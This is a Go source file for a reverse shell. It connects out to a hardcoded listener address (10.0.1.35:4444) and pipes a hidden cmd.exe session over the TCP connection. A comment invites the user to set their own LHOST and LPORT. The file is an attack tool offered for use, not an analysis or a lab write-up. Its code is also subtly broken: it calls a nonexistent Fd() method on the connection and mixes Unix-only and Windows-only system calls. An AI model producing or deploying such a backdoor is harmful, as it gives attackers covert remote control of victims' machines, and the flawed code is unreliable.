package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"syscall"
)

func main() {
	// Change these to your desired LHOST and LPORT
	LHOST := "10.0.1.35"
	LPORT := "4444"

	// Resolve the target address
	address := LHOST + ":" + LPORT

	// Dial the target address
	conn, err := net.Dial("tcp", address)
	if err != nil {
		fmt.Println("Error dialing:", err)
		return
	}
	defer conn.Close()

	// Redirect standard input/output/error to the connection
	go func() {
		_, err := syscall.Dup2(int(conn.Fd()), int(os.Stdin.Fd()))
		if err != nil {
			fmt.Println("Error redirecting stdin:", err)
			return
		}
	}()

	go func() {
		_, err := syscall.Dup2(int(conn.Fd()), int(os.Stdout.Fd()))
		if err != nil {
			fmt.Println("Error redirecting stdout:", err)
			return
		}
	}()

	go func() {
		_, err := syscall.Dup2(int(conn.Fd()), int(os.Stderr.Fd()))
		if err != nil {
			fmt.Println("Error redirecting stderr:", err)
			return
		}
	}()

	// Start a shell
	cmd := exec.Command("cmd.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	err = cmd.Run()
	if err != nil {
		fmt.Println("Error starting shell:", err)
	}
}
